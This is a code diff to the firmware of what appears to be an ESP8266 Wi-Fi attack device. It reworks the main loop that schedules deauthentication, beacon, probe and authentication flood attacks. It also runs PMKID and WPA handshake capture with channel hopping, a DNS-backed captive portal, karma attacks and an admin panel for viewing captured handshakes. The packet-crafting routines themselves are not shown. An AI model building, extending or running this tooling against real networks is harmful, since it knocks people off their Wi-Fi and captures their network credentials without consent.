-  state.adminServer->on("/admin", AdminHandlers::handleAdminRoot);
-  state.adminServer->on("/admin/json", AdminHandlers::handleAdminJSON);
-  state.adminServer->on("/admin/clear", AdminHandlers::handleAdminClear);
-  state.adminServer->onNotFound(AdminHandlers::handleAdminNotFound);
-  
+
+  state.adminServer->on("/",           AdminHandlers::handleRoot);
+  state.adminServer->on("/admin",      AdminHandlers::handleRoot);
+  state.adminServer->on("/admin/json", AdminHandlers::handleJSON);
+  state.adminServer->on("/admin/clear",AdminHandlers::handleClear);
+  state.adminServer->onNotFound(AdminHandlers::handleNotFound);
+
   state.server->begin();
   state.adminServer->begin();
-  Serial.println("✓ Web Server Started on port " + String(Config::WEB_PORT));
-  Serial.println("✓ Admin Server Started on port " + String(Config::ADMIN_PORT));
-  Serial.println("✓ DNS Server Initialized");
-  Serial.println();
-  Serial.println(String('=', 60));
-  Serial.println("System ready!");
-  Serial.println("Main Dashboard: http://" + ip.toString());
-  Serial.println("Admin Panel: http://" + ip.toString() + ":" + String(Config::ADMIN_PORT) + "/admin");
-  Serial.println("Handshake Viewer: http://" + ip.toString() + "/handshake");
-  Serial.println(String('=', 60));
-  Serial.println();
+
+  Serial.println(String("Web:   http://") + ip.toString());
+  Serial.println(String("Admin: http://") + ip.toString() + ':' + String(Config::ADMIN_PORT) + String("/admin"));
+  Serial.println(String("HS:    http://") + ip.toString() + String("/handshake"));
+  Serial.println(F("\nReady.\n"));
 }
 
+// ---------- Loop ----------
+
 void loop() {
-  if (state.server) {
-    state.server->handleClient();
+  state.packetCount = v_packetCount;
+  state.eapolCount  = v_eapolCount;
+
+  processEapol();
+  processKarmaQueue();
+
+  if (state.server)      state.server->handleClient();
+  if (state.adminServer) state.adminServer->handleClient();
+  if (state.dnsActive && state.dnsServer) state.dnsServer->processNextRequest();
+
+  unsigned long now = millis();
+
+  if (state.deauthActive && now - state.lastDeauth >= Config::DEAUTH_INTERVAL) {
+    Attacks::sendDeauth();
+    state.lastDeauth = now;
   }
-  
-  if (state.adminServer) {
-    state.adminServer->handleClient();
+  if (state.beaconFloodActive && now - state.lastBeacon >= Config::BEACON_INTERVAL) {
+    Attacks::sendBeacon();
+    state.lastBeacon = now;
   }
-  
-  if (state.dnsActive && state.dnsServer) {
-    state.dnsServer->processNextRequest();
+  if (state.probeFloodActive && now - state.lastProbe >= Config::PROBE_INTERVAL) {
+    Attacks::sendProbe();
+    state.lastProbe = now;
   }
-  
-  if (state.deauthActive) {
-    if (millis() - state.lastDeauth >= Config::DEAUTH_INTERVAL) {
-      Attacks::sendDeauthPacket();
-      state.lastDeauth = millis();
-    }
+  if (state.authFloodActive && now - state.lastAuth >= Config::AUTH_INTERVAL) {
+    Attacks::sendAuth();
+    state.lastAuth = now;
   }
-  
-  if (state.beaconFloodActive) {
-    if (millis() - state.lastBeacon >= Config::BEACON_INTERVAL) {
-      Attacks::sendBeaconPacket();
-      state.lastBeacon = millis();
-    }
+
+  if (state.channelHop && (state.pmkidActive || state.handshakeActive || state.snifferActive) &&
+      now - state.lastChannelHop >= Config::CHANNEL_HOP_INTERVAL) {
+    state.targetChannel = (state.targetChannel % 13) + 1;
+    wifi_set_channel(state.targetChannel);
+    state.lastChannelHop = now;
+    if (state.pmkidActive)
+      state.pmkidData = String("Hopping CH ") + String(state.targetChannel);
+    if (state.handshakeActive)
+      state.handshakeData = String("Hopping CH ") + String(state.targetChannel);
   }
-  
-  if (state.probeFloodActive) {
-    if (millis() - state.lastProbe >= Config::PROBE_INTERVAL) {
-      Attacks::sendProbePacket();
-      state.lastProbe = millis();
-    }
-  }
-  
-  if (state.authFloodActive) {
-    if (millis() - state.lastAuth >= Config::AUTH_INTERVAL) {
-      Attacks::sendAuthPacket();
-      state.lastAuth = millis();
-    }
-  }
-  
-  // Check for PMKID timeout
-  if (state.pmkidActive && millis() - state.lastPMKIDCheck > Config::PMKID_TIMEOUT) {
+
+  if (state.pmkidActive && !state.channelHop && now - state.lastPMKIDCheck > Config::PMKID_TIMEOUT) {
     if (state.eapolCount == 0) {
-      // No EAPOL frames received, try a different channel
       state.targetChannel = (state.targetChannel % 13) + 1;
       wifi_set_channel(state.targetChannel);
-      state.pmkidData = "Listening on CH " + String(state.targetChannel) + " - No EAPOL frames, trying next channel";
+      state.pmkidData = String("No EAPOL - trying CH ") + String(state.targetChannel);
     }
-    state.lastPMKIDCheck = millis();
+    state.lastPMKIDCheck = now;
   }
-  
-  if (state.deauthActive || state.pmkidActive || state.portalActive || state.snifferActive ||
-      state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive) {
-    if (millis() - state.lastBlink >= Config::LED_BLINK_INTERVAL) {
+
+  bool anyActive = state.deauthActive || state.pmkidActive || state.portalActive ||
+                   state.snifferActive || state.handshakeActive || state.beaconFloodActive ||
+                   state.probeFloodActive || state.authFloodActive || state.karmaActive;
+  if (anyActive) {
+    if (now - state.lastBlink >= Config::LED_BLINK_INTERVAL) {
       digitalWrite(Config::LED_PIN, !digitalRead(Config::LED_PIN));
-      state.lastBlink = millis();
+      state.lastBlink = now;
     }
   } else {
-    digitalWrite(Config::LED_PIN, HIGH); 
+    digitalWrite(Config::LED_PIN, HIGH);
   }
-  
-  if (millis() - state.lastWatchdog >= Config::WATCHDOG_TIMEOUT) {
-    Utils::resetWatchdog();
+
+  if (now - state.lastWatchdog >= Config::WATCHDOG_TIMEOUT) {
+    Utils::feedWdt();
   }
-  
+
   yield();
 }
